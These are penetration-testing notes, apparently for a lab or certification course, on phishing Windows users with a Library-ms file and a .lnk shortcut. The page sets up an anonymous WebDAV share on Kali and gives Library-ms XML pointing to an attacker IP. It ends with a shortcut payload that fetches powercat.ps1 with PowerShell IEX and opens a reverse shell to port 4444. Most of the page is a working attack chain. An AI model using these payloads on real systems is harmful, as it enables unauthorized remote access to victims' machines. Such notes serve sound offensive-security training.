# Library-ms & lnk

### Webdav

```bash
kali@kali:~$ pip3 install wsgidav
```

_<mark style="color:red;">Once WsgiDAV is installed, we'll create the</mark> <mark style="color:red;"></mark><mark style="color:red;">**/home/kali/webdav**</mark> <mark style="color:red;"></mark><mark style="color:red;">directory to use as the WebDAV share that will contain our</mark> <mark style="color:red;"></mark><mark style="color:red;">**.lnk**</mark> <mark style="color:red;"></mark><mark style="color:red;">file. For now, let's place a</mark> <mark style="color:red;"></mark><mark style="color:red;">**test.txt**</mark> <mark style="color:red;"></mark><mark style="color:red;">file in this directory.</mark>_

_<mark style="color:red;">If the installation of WsgiDAV fails with</mark> <mark style="color:red;"></mark><mark style="color:red;">**error: externally-managed-environment**</mark><mark style="color:red;">, we can use a virtual environment or install the package python3-wsgidav with apt. In PEP 668, a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.</mark>_



```bash
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```



### **config.Library-ms**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

For change image icon u could change `<iconReference>imageres.dll,-1003</iconReference>`



### Create .lnk

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```
